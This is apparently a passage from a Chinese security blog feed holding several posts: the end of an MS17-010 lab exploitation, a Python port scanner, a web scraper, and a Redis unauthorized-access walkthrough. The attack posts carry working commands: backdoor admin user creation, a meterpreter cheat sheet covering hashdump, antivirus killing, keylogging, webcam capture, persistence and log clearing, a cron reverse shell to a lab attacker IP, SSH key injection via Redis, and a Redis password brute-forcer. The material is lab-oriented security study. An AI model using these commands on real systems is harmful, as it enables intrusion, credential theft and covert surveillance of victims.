<p> <img src="/article/7.jpg" alt="7" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/7.jpg" class="lozad post-image"></p>
<p>成功开启远程桌面</p>
<h2 id="4、切换到cmd命令行模式"><a href="#4、切换到cmd命令行模式" class="headerlink" title="4、切换到cmd命令行模式"></a>4、切换到cmd命令行模式</h2><pre class="highlight"><span class="line">shell</span><br></pre>

<p> <img src="/article/8.jpg" alt="8" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/8.jpg" class="lozad post-image"></p>
<h2 id="5、添加用户"><a href="#5、添加用户" class="headerlink" title="5、添加用户"></a>5、添加用户</h2><pre class="highlight"><span class="line">net user  </span><br></pre>

<p> <img src="/article/9.jpg" alt="9" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/9.jpg" class="lozad post-image"></p>
<pre class="highlight"><span class="line">net user hacker hacker.123 /add        #添加用户、密码</span><br><span class="line"></span><br><span class="line">net localgroup administrators hacker /add  #提权至管理员组</span><br><span class="line"></span><br><span class="line">net localgroup administrators        #查看管理员组成员</span><br></pre>

<p> <img src="/article/10.jpg" alt="10" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/10.jpg" class="lozad post-image"></p>
<p>提权成功</p>
<h2 id="6、开启远程桌面连接"><a href="#6、开启远程桌面连接" class="headerlink" title="6、开启远程桌面连接"></a>6、开启远程桌面连接</h2><p>a、win+r，输入mstsc调出远程桌面，输入账号密码进行远程桌面连接</p>
<p> <img src="/article/11.jpg" alt="11" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/11.jpg" class="lozad post-image"></p>
<p>b、成功连接至靶机</p>
<p> <img src="/article/12.jpg" alt="12" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/12.jpg" class="lozad post-image"></p>
<p>至此，本次利用结束。后文附上meterpreter的其他指令，不做演示。</p>
<p>附录</p>
<pre class="highlight"><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下</span><br><span class="line">getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run                          #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389            #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line"></span><br><span class="line">clearev                       							#清除日志</span><br><span class="line"></span><br><span class="line">run post/windows/manage/migrate                  #自动进程迁移     </span><br><span class="line">run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     </span><br><span class="line">run post/windows/manage/killav                   #关闭杀毒软件     </span><br><span class="line">run post/windows/manage/enable_rdp               #开启远程桌面服务     </span><br><span class="line">run post/windows/manage/autoroute                #查看路由信息     </span><br><span class="line">run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     </span><br><span class="line">run post/windows/gather/enum_applications        #列举应用程序     </span><br><span class="line">run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     </span><br><span class="line">run windows/gather/smart_hashdump                #dump出所有用户的hash</span><br><span class="line"></span><br></pre>

]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>MS17-010</tag>
      </tags>
  </entry>
  <entry>
    <title>Python之端口扫描</title>
    <url>/article/f37bf9f5.html</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>借用端口扫描脚本，记录socket模块和threading模块知识点，以供日后查询。</p>
<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="socket模块"><a href="#socket模块" class="headerlink" title="socket模块"></a>socket模块</h2><p>介绍：网络发包请求模块</p>
<p>使用</p>
<pre class="highlight"><span class="line">import socket						# 导包</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 		# 创建socket对象</span><br><span class="line">s.bind = ((host,port))				# 绑定端口</span><br><span class="line">s.close								# 断开连接</span><br><span class="line">s.send(msg.decode(&#x27;utf-8&#x27;))			# 发送数据</span><br><span class="line">s.recv(1024)						# 接受数据</span><br><span class="line">s.settimeout()						# 设置超时时间，单位秒</span><br><span class="line">s.sendall							# 发送完整TCP数据</span><br><span class="line">s.sendto							# 发送udp数据</span><br><span class="line"></span><br><span class="line"># 服务端</span><br><span class="line">s.listen							# 设置最大连接数</span><br><span class="line">csocket,addr = s.accept()			# 建立客户端连接</span><br><span class="line"></span><br><span class="line"># 客户端</span><br><span class="line">s.connect((host,port))				# 连接服务器</span><br></pre>



<h2 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h2><p>介绍：多线程模块</p>
<p>使用</p>
<pre class="highlight"><span class="line">import threading							# 导包</span><br><span class="line">t = threading.Thread(target=要执行的函数)		# 设置要开启线程的函数</span><br><span class="line">t.start()									# 开启线程</span><br><span class="line"># linux可直接Ctrl+c结束脚本，Windows下失效</span><br></pre>

<p>守护进程</p>
<pre class="highlight"><span class="line">t = threading.Thread(target=要执行的函数, daemon=True)   # 设置守护进程，父进程结束则结束全部进程</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"># 主线程空循环，防止结束，同时用来接收中断信号</span><br><span class="line">while True:</span><br><span class="line">	pass</span><br><span class="line"># 用于Windows下接收Ctrl+c信号，结束脚本程序。</span><br></pre>

<p>线程锁，防止多个线程同时操作一个资源对象</p>
<pre class="highlight"><span class="line">lock = threading.RLock() 	# 多线程开始之前定义</span><br><span class="line">lock.acquire()				# 获取锁</span><br><span class="line">lock.release()				# 释放锁</span><br></pre>

<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用端口扫描项目，梳理套接字、多线程（守护进程、线程锁）的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import queue</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"># 全局变量，队列，用来依次存储端口号</span><br><span class="line">q = queue.Queue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def portScan():</span><br><span class="line">    while not q.empty():</span><br><span class="line">        port = q.get()</span><br><span class="line">        # 设置套接字连接</span><br><span class="line">        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        # 设置超时重连时间，单位秒，不设置会导致发包速度极慢，默认15秒</span><br><span class="line">        c.settimeout(0.5)</span><br><span class="line">        # connect.ex()会一直尝试连接，连接成功返回0，失败返回错误信息（key值）</span><br><span class="line">        if c.connect_ex((host, port)) == 0:</span><br><span class="line">            print(&quot;%s:%d is open&quot; % (host, port))</span><br><span class="line">            s = host + &quot;:&quot; + str(port)</span><br><span class="line">            # 开启进程锁，多线程写入数据</span><br><span class="line">            lock.acquire()</span><br><span class="line">            with open(&#x27;./ports.txt&#x27;, &#x27;a&#x27;) as fp:</span><br><span class="line">                fp.write(s + &quot;\n&quot;)</span><br><span class="line">                # 释放锁</span><br><span class="line">            lock.release()</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;%s:%d not open&quot; % (host, port))</span><br><span class="line">        # 关闭套接字连接</span><br><span class="line">        c.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 独立执行时的程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    #argv用来接收用户输入，按输入次序分别为argv[0-n],argv[0]表示脚本名</span><br><span class="line">    if len(sys.argv) &lt; 3:</span><br><span class="line">        print(&quot;请以以下格式输入：&quot;)</span><br><span class="line">        print(&quot;python portScan.py ip 线程数&quot;)</span><br><span class="line">    host = sys.argv[1]</span><br><span class="line">    thread_num = int(sys.argv[2])</span><br><span class="line">    # 在进程开始前，定义进程锁，不可在进程中定义锁，否则线程自己使用自己的锁，则失去进程锁的意义</span><br><span class="line">    lock = threading.RLock()</span><br><span class="line"></span><br><span class="line">    for port in range(1, 65536):</span><br><span class="line">        q.put(port)</span><br><span class="line">    for i in range(thread_num):</span><br><span class="line">        # 开启守护进程</span><br><span class="line">        t = threading.Thread(target=portScan, daemon=True)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    # 设置主进程死循环，方便接收中断信号</span><br><span class="line">    # 因为设置了守护进程，所以主进程结束，子进程也会立刻结束</span><br><span class="line">    while 1:</span><br><span class="line">        pass</span><br></pre>

]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>socket模块</tag>
        <tag>threading模块</tag>
      </tags>
  </entry>
  <entry>
    <title>Python之网络爬虫</title>
    <url>/article/f3b65bec.html</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>借用网络爬虫脚本，记录下requests模块和bs4模块的知识点，以供日后查阅。</p>
<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h2><p>介绍：发送简单请求，获取响应</p>
<p>使用：</p>
<pre class="highlight"><span class="line">import requests				# 导包</span><br><span class="line">res = requests.get(url)		# 发送get请求包（可换成.post）</span><br><span class="line">res.text					# 获取返回包内容</span><br><span class="line">res.request					# 获取请求包内容</span><br><span class="line">res.encoding  				# 获取页面编码格式</span><br><span class="line">res.content			  		# http响应内容的二进制形式</span><br><span class="line">res.status_code				# http响应码，200响应成功，404失败</span><br></pre>



<h2 id="BeautifulSoup模块"><a href="#BeautifulSoup模块" class="headerlink" title="BeautifulSoup模块"></a>BeautifulSoup模块</h2><p>介绍：用于解析html/xml。</p>
<p>使用</p>
<pre class="highlight"><span class="line">from bs4 import BeautifulSoup				# 导包</span><br><span class="line">soup = BeautifulSoup(&#x27;html&#x27;, &#x27;lxml&#x27;)		# 获取html属性</span><br><span class="line">soup.title									# 获取其中title内容,包括标签</span><br><span class="line">soup.title.string							# 仅获取title</span><br><span class="line">soup.select									# 指定某个元素下某个标签</span><br><span class="line">	soup.select(&#x27;.book-mulu &gt; ul &gt; li &gt; a&#x27;)</span><br><span class="line">	同</span><br><span class="line">	soup.find(&#x27;div&#x27;,class_=&#x27;chapter_content&#x27;)</span><br><span class="line">soup.text									# 获取标签内容</span><br><span class="line">find_all									# 查找所有符合条件的元素</span><br><span class="line">find										# 匹配第一个元素</span><br><span class="line"></span><br></pre>



<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用网络爬虫脚本，梳理bs4、requests的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># 自定义请求头</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def page_link(url):</span><br><span class="line">    con = &#x27;&#x27;</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)</span><br><span class="line">    # 获取当前页面编码格式</span><br><span class="line">    code = reponse.encoding</span><br><span class="line">    # 对响应包的内容解码</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)</span><br><span class="line">    # 使用bs获取指定标签内容（需绑定解析器lxml）</span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;).select(&#x27;.onearcxsbd &gt; p&#x27;)</span><br><span class="line">    for i in soup:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        con = con + i.text</span><br><span class="line">    return con</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url = &#x27;https://www.xyyuedu.com/gdmz/sidamingzhu/sgyy/&#x27;      # 目标地址</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)            # 获取请求</span><br><span class="line">    # print(reponse.text)</span><br><span class="line">    code = reponse.encoding                                     # 获取编码方式</span><br><span class="line">    # code = reponse.apparent_encoding</span><br><span class="line">    # print(code)</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)         # 先以网页原编码方式编码，在以指定格式解码，注意，数据仅以编码方式存储，但未进行编码</span><br><span class="line">    # print(page_text)</span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;)                     # 创建soup对象并指定解析器</span><br><span class="line">    aAttr = soup.select(&#x27;.zhangjie2 &gt; li &gt; a&#x27;)                  # 获得url所在的标签信息</span><br><span class="line">    # print(aAttr)</span><br><span class="line"></span><br><span class="line">    for i in aAttr:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        title = i.text</span><br><span class="line">        link = &#x27;https://www.xyyuedu.com&#x27; + i[&#x27;href&#x27;]        # 获取章节连接</span><br><span class="line">        content = page_link(link)</span><br><span class="line">        print(&#x27;开始下载 \n&#x27; + title)</span><br><span class="line">        # print(title)</span><br><span class="line">        # print(link)</span><br><span class="line">        # print(content)</span><br><span class="line">        with open(&#x27;./三国演义.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as fp:</span><br><span class="line">            fp.write(title + &#x27;\n&#x27; + content + &#x27;\n\n\n&#x27;)</span><br><span class="line">            print(title + &#x27;\n&#x27; + &#x27;下载结束&#x27; + &#x27;\n&#x27;)</span><br></pre>

]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>BeautifulSoup模块</tag>
        <tag>requests模块</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis未授权访问漏洞复现</title>
    <url>/article/3b28a510.html</url>
    <content><![CDATA[<h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
<h1 id="二、漏洞特征"><a href="#二、漏洞特征" class="headerlink" title="二、漏洞特征"></a>二、漏洞特征</h1><p>开放6379端口，可尝试免密登录</p>
<p>漏洞版本：Redis 2.x，3.x，4.x，5.x</p>
<pre class="highlight"><span class="line">redis-cli -h x.x.x.x</span><br><span class="line">或</span><br><span class="line">redis-cli -h x.x.x.x -p 6379</span><br></pre>

<h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>攻击机：Kali2020.1</p>
<p>靶机：Ubuntu20 + Redis2.8.17</p>
<p>1、下载环境</p>
<pre class="highlight"><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br></pre>

<p>2、解压并进入安装目录</p>
<pre class="highlight"><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">make</span><br></pre>

<p>报错：</p>
<pre class="highlight"><span class="line">gcc: Command not found</span><br></pre>

<p>解决：安装gcc</p>
<pre class="highlight"><span class="line">apt install gcc</span><br></pre>

<p>清理编译文件，重新编译</p>
<pre class="highlight"><span class="line">make distclean  &amp;&amp; make</span><br></pre>

<p>3、</p>
<p>拷贝关键文件</p>
<pre class="highlight"><span class="line">cp redis.conf /etc/</span><br><span class="line">cd src</span><br><span class="line">cp redis-benchmark redis-cli redis-server /usr/bin/</span><br></pre>

<p>4、启动</p>
<pre class="highlight"><span class="line">./redis-server		#src目录</span><br></pre>

<p><img src="/article/image-20210702081136207.png" alt="image-20210702081136207.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210702081136207.png" class="lozad post-image"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="无密码登录"><a href="#无密码登录" class="headerlink" title="无密码登录"></a>无密码登录</h3><pre class="highlight"><span class="line">redis-cli -h 192.168.24.79		#登录</span><br></pre>

<p> <img src="/article/image-20210702081439554.png" alt="image-20210702081439554" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210702081439554.png" class="lozad post-image"></p>
<p>登陆成功</p>
<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>前提：登陆成功、知道路径（phpinfo或错误暴路径等）、读写权限等</p>
<p>因为没有搭建网站环境，这里写在用户根目录</p>
<pre class="highlight"><span class="line">config set dir /home/chen/</span><br><span class="line">config set dbfilename redis.php	</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">或</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre>

<p> <img src="/article/image-20210702082718934.png" alt="image-20210702082718934" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210702082718934.png" class="lozad post-image"></p>
<p>靶机成功写入</p>
<p> <img src="/article/image-20210702082834213.png" alt="image-20210702082834213" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210702082834213.png" class="lozad post-image"></p>
<h3 id="定时反弹shell"><a href="#定时反弹shell" class="headerlink" title="定时反弹shell"></a>定时反弹shell</h3><p>需要管理员权限</p>
<pre class="highlight"><span class="line">nc -lvnp 4444		# 攻击机开启监听</span><br><span class="line"></span><br><span class="line"># 连接redis，写定时反弹shell</span><br><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.24.82/4444 0&gt;&amp;1\n\n&quot;		#每分钟执行一次反弹连接</span><br><span class="line">save</span><br></pre>

<p> <img src="/article/image-20210702084716304.png" alt="image-20210702084716304" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210702084716304.png" class="lozad post-image"></p>
<p>注意！</p>
<p>1、Ubuntu系统需要以管理员权限更改/bin下的软链接指向</p>
<pre class="highlight"><span class="line">ln -s -f bash /bin/sh		# 定时任务bash为dash,无交互功能</span><br></pre>

<p>2、Ubuntu下定时任务乱码则不执行，需手动删除乱码</p>
<p>3、redis远程连接创建定时任务权限为644，但是定时任务权限需要为600才可执行</p>
<pre class="highlight"><span class="line">chmod 600 root</span><br></pre>

<p>解决以上坑点，成功反弹shell</p>
<p> <img src="/article/image-20210702230552921.png" alt="image-20210702230552921" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210702230552921.png" class="lozad post-image"></p>
<p>但是这样意义不大，据说centos无以上坑点。</p>
<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>1、攻击机生成ssh密钥（空密码）</p>
<pre class="highlight"><span class="line">ssh-keygen -t rsa		# 全部回车</span><br><span class="line">cd .ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt		# 写入公钥</span><br></pre>

<p>2、设置redis变量</p>
<pre class="highlight"><span class="line">cat ./key.txt | redis-cli -h 192.168.24.79 -x set tide		# 将公钥内容设置给redis变量（靶机ip）</span><br></pre>

<p>3、连接redis并写入</p>
<pre class="highlight"><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line">config set dir /root/.ssh					# 默认公私钥路径</span><br><span class="line">config set dbfilename authorized_keys		# 写入authorized_keys</span><br><span class="line">save</span><br></pre>

<p>4、检查靶机文件是否写入–已写入（同样带有乱码）</p>
<p> <img src="/article/image-20210703101552835.png" alt="image-20210703101552835" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703101552835.png" class="lozad post-image"></p>
<p>5、攻击机进行ssh连接</p>
<pre class="highlight"><span class="line">ssh -o StrictHostKeyChecking=no 192.168.24.79		# 首次连接需要加-o StrictHostKeyChecking=no</span><br></pre>

<p> <img src="/article/image-20210703102221333.png" alt="image-20210703102221333" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703102221333.png" class="lozad post-image"></p>
<p>连接成功</p>
<p>（注：靶机需要安装ssh服务并关闭防火墙，或者允许22端口通过防火墙）</p>
<p>附Ubuntu安装ssh</p>
<pre class="highlight"><span class="line">sudo apt-get install openssh-server		# 安装ssh</span><br><span class="line">sudo /etc/init.d/ssh start 				# 开启ssh</span><br><span class="line">ufw allow 22/tcp						# 允许通过防火墙</span><br><span class="line">或</span><br><span class="line">sudo ufw disable						# 不建议</span><br></pre>





<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>redis:4.x - redis:5.0.5版本漏洞，redis开启主从复制，主从数据相同，主redis只写，从redis只读，从而减小服务器压力。在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so恶意文件，就可以拓展新命令。</p>
<p>到这里懒癌犯了，不想搭环境了，附上脚本下载链接，直接过，遇到回头再来。</p>
<pre class="highlight"><span class="line">https://github.com/n0b0dyCN/redis-rogue-server</span><br></pre>

<p>这里还有个内网redis利用姿势–gopher协议，一并懒过去。</p>
<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>感觉这个比较实用，弱口令yyds！</p>
<p>准备：</p>
<p>打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码</p>
<p> <img src="/article/image-20210703105503697.png" alt="image-20210703105503697" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703105503697.png" class="lozad post-image"></p>
<p>密码登录</p>
<pre class="highlight"><span class="line">redis-cli -h 192.168.24.79 -a password</span><br></pre>



<p>以上，开始编写Python脚本</p>
<pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：redis未授权访问探测 + 密码爆破</span><br><span class="line">    author: chen</span><br><span class="line">    date: 2021-07-03</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def poc():</span><br><span class="line">    global flag</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    # 发送INFO，如果无密码则返回服务器信息，包含版本信息；如果有密码，则返回“-NOAUTH Authentication required”</span><br><span class="line">    s.send(&#x27;INFO\r\n&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    result = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">    if &quot;redis_version&quot; in result:</span><br><span class="line">        print(&quot;存在redis未授权访问漏洞！&quot;)</span><br><span class="line">        flag = True</span><br><span class="line">    elif &quot;Authentication&quot; in result:</span><br><span class="line">        flag = False</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;未知错误&quot;)</span><br><span class="line">        flag = None</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def burst():</span><br><span class="line">    while not q.empty():</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, port))</span><br><span class="line">        _pass = q.get()</span><br><span class="line">        msg = &quot;AUTH &quot; + _pass + &quot;\r\n&quot;          # AUTH pass 为redis密码格式</span><br><span class="line">        s.send(msg.encode(&#x27;utf-8&#x27;))</span><br><span class="line">        result = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        if &#x27;+OK&#x27; in result:</span><br><span class="line">            print(&quot;存在弱口令，密码为%s&quot; % _pass)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    if len(sys.argv) != 5:</span><br><span class="line">        print(&quot;请按照格式输出：\n&quot;)</span><br><span class="line">        print(&quot;redis.py 10.10.10.10 6379 字典名 线程数 \n&quot;)</span><br><span class="line"></span><br><span class="line">    flag = True</span><br><span class="line">    q = queue.Queue()</span><br><span class="line"></span><br><span class="line">    ip = sys.argv[1]</span><br><span class="line">    port = int(sys.argv[2])</span><br><span class="line">    dic = sys.argv[3]</span><br><span class="line">    thread = sys.argv[4]</span><br><span class="line"></span><br><span class="line">    poc()</span><br><span class="line"></span><br><span class="line">    if flag:</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        path = os.path.dirname(os.path.realpath(__file__))      # 获取当前脚本目录</span><br><span class="line">        for i in open(path + &#x27;/&#x27; + dic):</span><br><span class="line">            q.put(i.strip())                                    # 清洗字符，去掉头尾的换行和空格</span><br><span class="line">        for i in range(int(thread)):</span><br><span class="line">            t = threading.Thread(target=burst(), daemon=True)</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        pass</span><br></pre>

<p>结果：</p>
<p>空密码：</p>
<p><img src="/article/image-20210703153927019.png" alt="image-20210703153927019" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703153927019.png" class="lozad post-image"></p>
<p>设置密码</p>
<p><img src="/article/image-20210703153726385.png" alt="image-20210703153726385" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703153726385.png" class="lozad post-image"></p>
